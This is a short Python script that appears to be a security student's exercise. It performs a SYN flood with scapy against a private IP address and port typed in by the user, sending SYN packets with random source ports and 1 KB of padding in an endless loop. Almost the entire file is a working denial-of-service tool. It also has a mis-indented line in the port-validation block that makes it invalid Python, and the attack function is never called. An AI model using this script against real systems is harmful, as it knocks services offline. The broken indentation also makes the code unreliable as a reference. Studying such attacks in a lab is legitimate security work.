# Paulo Abade - 23919
# Mestrado de Engenharia de Segurança Informática
# Iniciado em 19/10/2025
# Última atualização: 21/10/2025

# Faz um ataque de SYN Flood a um IP e a uma porta que tenham sido especificados pelo utilizador
# Foi seguido o tutorial de: https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python

from scapy.all import *
import ipaddress


def syn_attack():
    print("SYN Flood Attack \n")
    
    # Validar o endereço IP
    is_an_ip = False
    while not is_an_ip:
        target_ip = input("Insira um IP dentro da sua rede privada (ex: 192.168.1.254): \n")
        try:
            ip_obj = ipaddress.ip_address(target_ip)
            # Verifica se é um IP privado
            if ip_obj.is_private:
                is_an_ip = True
            else:
                print("Erro: Insira um IP privado (192.168.x.x, 10.x.x.x, 172.16-31.x.x)")
        except ValueError:
            print("Erro: Formato de IP inválido")

    # Validar o número da porta
    isnumber = False
    while not isnumber:
        try:
            target_port = int(input("Insira uma porta válida entre 0 e 65535 (ex: 80, 443, etc...): \n"))
            if 1 <= target_port <= 65535:
                isnumber = True
            else:
                print("Erro: A porta deve estar entre 1 e 65535")
        except ValueError:
        print("Erro: Insira apenas números")
    
    # É informado qual o endereço de destino
    ip = IP(dst=target_ip)
    # É informado qual a porta de origem aleatoriamente, a porta de destino escolhida pelo utilizador, e a flag SYN, neste caso.
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")  

    # É adicionado contéudo para inundar e travar a vítima. Neste caso 1KB
    raw = Raw(b"X"*1024)

    #  Cria o pacote que será enviado
    p = ip / tcp / raw 
    
    # Envia o pacote para a 4ª camada. Só para quando o utilizador apertar CTRL+C
    send(p, loop=1, verbose=0) 
